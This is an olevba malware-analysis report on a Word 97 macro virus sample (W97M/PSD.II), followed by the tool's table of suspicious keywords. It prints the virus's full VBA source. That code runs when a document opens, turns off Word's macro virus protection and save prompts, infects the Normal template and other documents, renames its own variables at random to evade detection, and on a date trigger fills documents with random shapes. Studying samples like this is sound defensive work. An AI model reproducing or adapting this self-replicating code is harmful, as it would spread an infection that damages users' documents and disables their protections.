olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Psd.b-e2084926943c15c6a95c427ab23fcd302f47720f
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.Psd.b-e2084926943c15c6a95c427ab23fcd302f47720f - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Private Sub Document_Open()
On Error Resume Next
Options.ConfirmConversions = 0: Options.VirusProtection = 0: Options.SaveNormalPrompt = 0
If Day(Now) = Minute(Now) Then
Randomize: For TD9795 = 1 To (Int(Rnd * 70))
ActiveDocument.Shapes.AddShape(Int(Rnd * 120), Int(Rnd * 200), Int(Rnd * 500), Int(Rnd * 500), Int(Rnd * 500)).Select
Selection.ShapeRange.Fill.ForeColor.RGB = RGB(Int(Rnd * 255), Int(Rnd * 255), Int(Rnd * 255))
Selection.ShapeRange.Fill.Visible = msoTrue
Selection.ShapeRange.Fill.Solid: Next TD9795: End If
SM3738 = ActiveDocument.VBProject.VBComponents.Item(1).CodeModule.CountOfLines
SU4685 = NormalTemplate.VBProject.VBComponents.Item(1).CodeModule.CountOfLines
If Left(ActiveDocument.VBProject.VBComponents.Item(1).CodeModule.Lines(1, 3), 3) <> "Pri" Then
Set DB3758 = ActiveDocument.VBProject.VBComponents.Item(1)
IO3989 = True
End If
If Left(NormalTemplate.VBProject.VBComponents.Item(1).CodeModule.Lines(1, 3), 3) <> "Pri" Then
Set DB3758 = NormalTemplate.VBProject.VBComponents.Item(1)
IP7962 = True
Call MU3966_RV9217
ActiveDocument.Saved = True
End If
If IP7962 <> True And IO3989 <> True Then GoTo MG5027
If IP7962 = True Then DB3758.CodeModule.AddFromString ("Private Sub Document_Close()" & vbCr & ActiveDocument.VBProject.VBComponents.Item(1).CodeModule.Lines(2, SM3738 - 1) & vbCr & "Sub ViewVBCode()" & vbCr & "Application.Quit SaveChanges:=wdDoNotSaveChanges" & vbCr & "End Sub")
If IO3989 = True Then DB3758.CodeModule.AddFromString ("Private Sub Document_Open()" & vbCr & NormalTemplate.VBProject.VBComponents.Item(1).CodeModule.Lines(2, SU4685 - 4))
MG5027:
If SU4685 <> 0 And SM3738 = 0 And (InStr(1, ActiveDocument.Name, "Document") = False) Then
ActiveDocument.SaveAs FileName:=ActiveDocument.FullName
ElseIf (InStr(1, ActiveDocument.Name, "Document") <> False) Then
ActiveDocument.Saved = True: End If
End Sub 'W97M/PSD.II ...logically delicious! [(c)1998 ALT-F11 code hack]
Private Function MU3966_RV9217()
On Error Resume Next
Randomize
Dim r1(1 To 15) As String
r1(1) = "AG755": r1(2) = "FO925": r1(3) = "BO9057": r1(4) = "CQ2023": r1(5) = "RV9217": r1(6) = "SM3738"
r1(7) = "SU4685": r1(8) = "IO3989":: r1(9) = "DB3758": r1(10) = "IP7962": r1(11) = "MG5027": r1(12) = "MU3966": r1(13) = "JG2428": r1(14) = "HN7678": r1(15) = "TD9795"
For TD9795 = 1 To 15
a1 = (Chr(65 + Int(Rnd * 22))) & (Chr(65 + Int(Rnd * 22))) & Int(Rnd * 100) & Int(Rnd * 100)
Call RV9217(a1, r1(TD9795))
Next TD9795
End Function 'VAMP v1.0 [thanks Vic!]
Private Function RV9217(HN7678, JG2428 As String)
On Error Resume Next
Dim AG755 As Long: Dim FO925 As Long: Dim BO9057 As Long: Dim CQ2023 As Long
With ActiveDocument.VBProject.VBComponents.Item(1).CodeModule
AG755 = 1: FO925 = 1: BO9057 = .CountOfLines: CQ2023 = Len(.Lines(.CountOfLines, 1))
Do While .Find(JG2428, AG755, FO925, BO9057, CQ2023, True)
strline = .Lines(AG755, 1)
strline = Left(strline, FO925 - 1) & HN7678 & Mid(strline, CQ2023)
.replaceline AG755, strline
AG755 = BO9057 + 1: FO925 = 1:
BO9057 = .CountOfLines
CQ2023 = Len(.Lines(.CountOfLines, 1))
Loop
End With
End Function

Private Function AO536_EH5343()
On Error Resume Next
Randomize
Dim r1(1 To 15) As String
r1(1) = "JN7463": r1(2) = "RQ6785": r1(3) = "GV667": r1(4) = "BB6861": r1(5) = "EH5343": r1(6) = "RH9693"
r1(7) = "ER9792": r1(8) = "JO7950":: r1(9) = "RL7359": r1(10) = "CE2168": r1(11) = "IR1686": r1(12) = "AO536": r1(13) = "QT1660": r1(14) = "DT8392": r1(15) = "KG6063"
For KG6063 = 1 To 15
a1 = (Chr(65 + Int(Rnd * 22))) & (Chr(65 + Int(Rnd * 22))) & Int(Rnd * 100) & Int(Rnd * 100)
Call EH5343(a1, r1(KG6063))
Next KG6063
End Function 'VAMP v1.0 [thanks Vic!]
Private Function EH5343(DT8392, QT1660 As String)
On Error Resume Next
Dim JN7463 As Long: Dim RQ6785 As Long: Dim GV667 As Long: Dim BB6861 As Long
With ActiveDocument.VBProject.VBComponents.Item(1).CodeModule
JN7463 = 1: RQ6785 = 1: GV667 = .CountOfLines: BB6861 = Len(.Lines(.CountOfLines, 1))
Do While .Find(QT1660, JN7463, RQ6785, GV667, BB6861, True)
strline = .Lines(JN7463, 1)
strline = Left(strline, RQ6785 - 1) & DT8392 & Mid(strline, BB6861)
.replaceline JN7463, strline
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |Document_Close      |Runs when the Word document is closed        |
|AutoExec  |Document_Open       |Runs when the Word or Publisher document is  |
|          |                    |opened                                       |
|Suspicious|Call                |May call a DLL using Excel 4 Macros (XLM/XLF)|
|Suspicious|Chr                 |May attempt to obfuscate specific strings    |
|          |                    |(use option --deobf to deobfuscate)          |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|CodeModule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|AddFromString       |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|Base64 Strings      |Base64-encoded strings were detected, may be |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
+----------+--------------------+---------------------------------------------+

